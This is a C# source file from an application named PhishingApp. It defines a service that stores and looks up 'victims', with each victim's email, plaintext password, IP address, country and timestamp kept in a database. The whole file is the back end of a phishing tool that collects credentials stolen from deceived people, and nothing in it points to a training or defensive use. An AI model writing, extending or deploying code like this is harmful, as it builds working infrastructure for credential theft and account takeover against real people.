using PhishingApp.Database;
using PhishingApp.Model;
using System.Collections.Generic;
using System.Data.Entity;
using System.Threading.Tasks;

namespace PhishingApp.Commands
{
    public class VictimService
    {
        private readonly PhishingAppDbContext _dbContext;
        public VictimService(PhishingAppDbContext dbContext)
        {
            _dbContext = dbContext;
        }

        public async Task<List<Victim>> GetAllVictims()
        {
            return await _dbContext.Victims.ToListAsync();
        }

        public async Task<bool> ExistsVictimWithEmail(string email)
        {
            return await _dbContext.Victims.AnyAsync(x => x.Email == email);
        }

        public async Task<Victim> AddNewVictim(string email, string password, long timestamp, string ipAddress, string country)
        {
            Victim newVictim = new Victim()
            {
                Email = email,
                Password = password,
                Timestamp = timestamp,
                IpAddress = ipAddress,
                Country = country,
            };

            _dbContext.Victims.Add(newVictim);

            await _dbContext.SaveChangesAsync();

            return newVictim;
        }
    }
}
